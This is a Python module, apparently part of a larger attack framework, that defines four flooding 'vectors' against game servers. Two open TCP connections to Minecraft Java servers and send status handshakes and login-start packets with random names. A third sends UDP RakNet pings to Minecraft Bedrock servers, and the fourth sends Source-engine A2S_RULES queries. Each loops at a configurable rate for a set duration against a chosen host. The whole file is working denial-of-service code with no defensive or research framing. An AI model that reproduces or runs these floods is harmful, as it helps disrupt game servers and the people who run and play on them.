import random
import socket
import struct
import time
from _lib.ring1.base import Vector


def _varint(n):
    out = b""
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out += bytes([b | 0x80])
        else:
            out += bytes([b])
            return out


def _str(s):
    b = s.encode()
    return _varint(len(b)) + b


def _pkt(pid, payload=b""):
    body = _varint(pid) + payload
    return _varint(len(body)) + body


class McStatusFlood(Vector):
    name = "mc-status"; needs = ["game-mc"]
    def run(self, d, args):
        host = d.get("ipv4") or d.get("ipv6")
        port = d["target"].get("port") or 25565
        end = time.time() + args.duration
        sent = 0
        while time.time() < end:
            try:
                s = socket.create_connection((host, port), timeout=3)
                hs = _pkt(0x00, _varint(765) + _str(host) +
                          struct.pack(">H", port) + _varint(1))
                s.sendall(hs)
                s.sendall(_pkt(0x00))
                s.recv(4096)
                s.close()
                sent += 1
            except Exception:
                pass
            time.sleep(1.0 / max(1, args.rate))
        print(f"  mc-status: {sent}")


class McLoginStartFlood(Vector):
    name = "mc-login-start"; needs = ["game-mc"]
    def run(self, d, args):
        host = d.get("ipv4") or d.get("ipv6")
        port = d["target"].get("port") or 25565
        end = time.time() + args.duration
        sent = 0
        while time.time() < end:
            try:
                s = socket.create_connection((host, port), timeout=3)
                hs = _pkt(0x00, _varint(765) + _str(host) +
                          struct.pack(">H", port) + _varint(2))
                s.sendall(hs)
                name = "".join(random.choices("abcdefghijklmnop", k=8))
                s.sendall(_pkt(0x00, _str(name)))
                s.close()
                sent += 1
            except Exception:
                pass
            time.sleep(1.0 / max(1, args.rate))
        print(f"  mc-login-start: {sent}")


class RaknetPingFlood(Vector):
    name = "mc-bedrock-ping"; needs = ["game-mcbe"]
    def run(self, d, args):
        host = d.get("ipv4")
        port = d["target"].get("port") or 19132
        payload = b"\x01" + struct.pack(">Q", int(time.time() * 1000)) + b"\x00" * 8 + b"\x00" * 8
        end = time.time() + args.duration
        sent = 0
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(payload, (host, port))
                sent += 1
                s.close()
            except Exception:
                pass
            time.sleep(1.0 / max(1, args.rate))
        print(f"  raknet ping: {sent}")


class SourceA2SFlood(Vector):
    name = "source-a2s"; needs = ["game-source"]
    def run(self, d, args):
        host = d.get("ipv4")
        port = d["target"].get("port") or 27015
        end = time.time() + args.duration
        sent = 0
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(b"\xFF\xFF\xFF\xFF\x56\x00\x00\x00\x00", (host, port))
                sent += 1
                s.close()
            except Exception:
                pass
            time.sleep(1.0 / max(1, args.rate))
        print(f"  source a2s_rules: {sent}")
